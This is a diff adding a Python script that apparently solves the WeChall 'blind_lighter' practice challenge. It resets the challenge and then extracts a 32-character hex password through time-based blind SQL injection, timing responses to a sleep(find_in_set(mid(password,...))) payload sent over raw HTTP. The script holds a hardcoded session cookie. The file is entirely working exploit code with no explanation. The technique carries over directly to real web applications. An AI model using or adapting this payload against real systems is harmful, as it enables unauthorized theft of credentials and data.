@@ -1,0 +1,48 @@
+#!/usr/bin/python
+import socket
+import time
+import math
+import sys
+import requests
+from urllib import quote_plus as quote
+
+sess = 'WC=7280826-7498-lft2fRXQcrYBE5m3'
+
+def req(sql):
+	conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	conn.connect(('www.wechall.net', 80))
+	post = 'injection=%s&inject=Inject' % quote(sql)
+	data = 'POST /challenge/blind_lighter/index.php?ajax=1 HTTP/1.1\r\n' 
+	data += 'Host: www.wechall.net\r\n'
+	data += 'Cookie: %s\r\n' % sess
+	data += 'Connection: keep-alive\r\n'
+	data += 'Content-Type: application/x-www-form-urlencoded\r\n'
+	data += 'Content-Length: %s\r\n\r\n' % len(post)
+	data += post
+	t1 = time.time()
+	conn.send(data)
+	data = conn.recv(4096)
+	t2 = time.time()
+	conn.close()
+	return t2 - t1
+
+def reset():
+	html = requests.get('http://www.wechall.net/challenge/blind_lighter/index.php?reset=me', headers = {'Cookie' : sess}).content
+	if html.find('Your password has been scrambled for security reasons.') != -1:
+		print '[+] Reset OK'
+
+def pwn():
+	sys.stdout.write('[+] Start\n')
+	charset = '0123456789ABCDEF'
+	s = ','.join(list(charset))
+	for i in xrange(1, 33):
+		t = req("xxx' or sleep(find_in_set(mid(password,%s,1),'%s')) -- " % (i, s))
+		cnt = int(math.floor(t)) - 1
+		if not(0 <= cnt < len(charset)):
+			sys.stdout.write('\n[-] Error')
+			break
+		sys.stdout.write(charset[cnt])
+	sys.stdout.write('\n[+] Done\n')
+
+reset()
+pwn()
